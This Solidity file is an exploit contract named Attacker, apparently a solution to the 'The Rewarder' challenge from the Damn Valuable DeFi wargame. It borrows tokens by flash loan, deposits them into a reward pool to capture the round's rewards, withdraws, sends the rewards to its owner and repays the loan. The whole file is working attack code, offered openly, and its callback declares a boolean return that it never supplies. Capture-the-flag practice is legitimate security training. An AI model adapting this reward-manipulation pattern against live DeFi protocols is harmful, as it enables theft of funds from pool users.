pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./AccountingToken.sol";


contract Attacker {
    using Address for address payable;

    address immutable owner;

    address immutable token;
    address immutable pool;
    address immutable flash;
    

    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewarderPool;
    FlashLoanerPool public immutable flashLoaner;
    AccountingToken public immutable accToken;
    RewardToken public immutable rwdTk; 
    constructor(address liquidityTokenAddress, address rewarder, address flashL, address accTk, address rToken) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewarderPool = TheRewarderPool(rewarder);
        flashLoaner = FlashLoanerPool(flashL);
        accToken = AccountingToken(accTk);
        rwdTk = RewardToken(rToken);

        owner = msg.sender;

        token = liquidityTokenAddress;
        pool = rewarder;
        flash = flashL; 
    }

    function attack (uint256 amount) public {
        flashLoaner.flashLoan(amount);
    }


    function receiveFlashLoan(uint256 amount) public returns(bool){
        liquidityToken.approve(pool, amount);
        rewarderPool.deposit(amount);
        uint256 rewards = rewarderPool.distributeRewards();
        uint256 _amountToWithdraw = accToken.balanceOf(address(this));
        rewarderPool.withdraw(_amountToWithdraw);
        uint256 _amountToTransfer = rwdTk.balanceOf(address(this));
        rwdTk.transfer(owner, _amountToTransfer);
        liquidityToken.transfer(flash, amount);
        
    }

}